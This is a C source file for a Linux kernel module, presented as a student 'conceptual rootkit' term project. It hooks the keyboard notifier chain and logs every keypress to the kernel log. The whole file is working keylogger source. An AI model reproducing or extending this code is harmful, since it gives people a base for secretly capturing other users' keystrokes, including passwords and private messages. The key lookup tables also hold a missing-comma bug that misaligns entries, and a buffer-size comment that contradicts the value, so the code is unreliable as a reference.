/**
 * Project:
 *   + A conceptual rootkit developed as a term project.
 *   + COSC 439, Towson University
 *   + Taught by Shiva Azadegan
 *
 * Usage:
 *   START: $> insmod rootkit.ko
 *   STOP : $> rmmod rootkit
 * 
 * Authors:
 *   + Zachary Brown
 *   + Kevin Hoganson
 *   + Alexander Slonim
**/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>

#define KEYBOARD_BUFFER_SIZE 10000		/* Allocate 10MB for keylog buffer. */

#define SHIFT_KEY_T   1					/* Shift key is enabled.  */
#define SHIFT_KEY_F   0					/* Shift key is disabled. */
#define CAPS_ENABLED  1					/* Capslock is enabled.	  */
#define CAPS_DISABLED 0					/* Capslock is disabled.  */

/**
 * Correlates with the key definitions found in:
 * /usr/include/linux/input.h
 * 
 * TODO:
 *   - Configure letters to be lowercase. 
**/
char *letters[] = 
{
	"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	"-", "=", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
	"O", "P", "[", "]", "ENTER", "LCTRL", "A", "S", "D", "F", "G", "H",
	"J", "K", "L", ";", "'", "`", "LSHIFT", "\\", "Z", "X", "C", "V", "B",
	"N", "M", ",", ".", "/", "RSHIFT", "*", "LALT", " ", "CAPS", "F1",
	"F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK",
	"SCROLLLOCK" "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3",
	"0", "."
};

/**
 * Can be used for uppercase lettering. In other words:
 * Use this whenever SHIFT / CAPS is enabled.
**/
char *shift_letters[] = 
{
	"RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
	"_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
	"O", "P", "{", "}", "ENTER", "LCTRL", "A", "S", "D", "F", "G", "H",
	"J", "K", "L", ":", "\"", "~", "LSHIFT", "|", "Z", "X", "C", "V", "B",
	"N", "M", "<", ">", "?", "RSHIFT", "*", "LALT", " ", "CAPS", "F1",
	"F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK",
	"SCROLLLOCK" "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3",
	"0", "."
};

/**
 * TODO: 
 *   - Get CAPSLOCK state, and filter for 'SHIFT' characters.
**/
int notification(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	int    ret = NOTIFY_OK;

	// int shift_state;
	// int  caps_state;

	// 83 character values are registered above (letters). 
	if (code == KBD_KEYCODE && param->value <= 83)
	{
		if (param->down)
		{
			printk(KERN_DEBUG "KEYLOGGER <'%s'>\n", letters[param->value]);
		}
	}

	return ret;
}

static struct notifier_block nb =
{
	.notifier_call = notification
};

int start(void)
{
	printk("Started.\n");
	printk("Registering keyboard notifier.\n");

	register_keyboard_notifier(&nb);

	return 0;
}

void stop(void)
{
	printk("Stopped.\n");
	printk("Unregistering keyboard notifier.\n");

	unregister_keyboard_notifier(&nb);
}

module_init(start);
module_exit(stop);

MODULE_LICENSE("GPL");